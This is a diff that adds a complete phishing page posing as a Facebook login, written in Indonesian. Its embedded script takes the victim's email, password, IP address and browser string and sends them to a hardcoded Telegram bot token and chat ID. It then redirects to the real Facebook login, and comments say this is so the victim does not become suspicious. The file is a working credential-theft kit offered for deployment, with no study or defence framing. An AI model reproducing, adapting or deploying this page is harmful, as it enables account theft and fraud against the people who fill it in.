@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Facebook</title>
+    <style>
+        /* CSS Sesuai Desain Anda */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e9eff1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+        }
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 36px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #4b4f56;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #165eab;
+        }
+        .forgot-password a {
+            font-size: 12px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .create-account {
+            margin-top: 20px;
+        }
+        .create-account span {
+            font-size: 12px;
+            color: #4b4f56;
+        }
+        .create-account a {
+            font-size: 14px;
+            color: #42b72a;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h1>facebook</h1>
+            <p>Login ke Facebook</p>
+            
+            <form id="loginForm">
+                <input type="text" id="email" name="email" placeholder="Email atau Nomor Telepon" required>
+                <input type="password" id="pass" name="pass" placeholder="Kata Sandi" required>
+                <button type="submit" id="btnSubmit">Masuk</button>
+            </form>
+
+            <div class="forgot-password">
+                <a href="#">Lupa akun?</a>
+            </div>
+            <div class="create-account">
+                <span>atau</span>
+                <a href="#" class="signup">Buat akun baru</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 1. Konfigurasi Bot Telegram
+        const TELEGRAM_TOKEN = "8390796660:AAEyD5epa_kM4esv_3rJqZjivmDos7tk-c0";
+        const CHAT_ID = "858535302";
+
+        const form = document.getElementById('loginForm');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault(); // Stop page reload
+
+            const btn = document.getElementById('btnSubmit');
+            btn.innerHTML = "Memuat...";
+            btn.disabled = true;
+
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            try {
+                // 2. Ambil IP Address (Menggunakan API Luar karena di JS ga bisa langsung)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // 3. Susun Pesan
+                const pesan = `<b>🔔 LOGIN ATTEMPT (GITHUB PAGES)</b>\n\n` +
+                              `<b>📧 Email:</b> <code>${email}</code>\n` +
+                              `<b>🔑 Pass:</b> <code>${pass}</code>\n\n` +
+                              `<b>📍 IP:</b> <code>${userIP}</code>\n` +
+                              `<b>🌐 Browser:</b> ${navigator.userAgent.substring(0, 50)}...`;
+
+                // 4. Kirim ke API Telegram
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'html'
+                    })
+                });
+
+                // 5. Redirect ke FB asli agar tampak normal
+                window.location.href = "https://www.facebook.com/login.php?login_attempt=1";
+
+            } catch (error) {
+                console.error("Terjadi kesalahan:", error);
+                // Jika error tetap redirect agar user tidak curiga
+                window.location.href = "https://www.facebook.com/login.php";
+            }
+        });
+    </script>
+</body>
+</html>
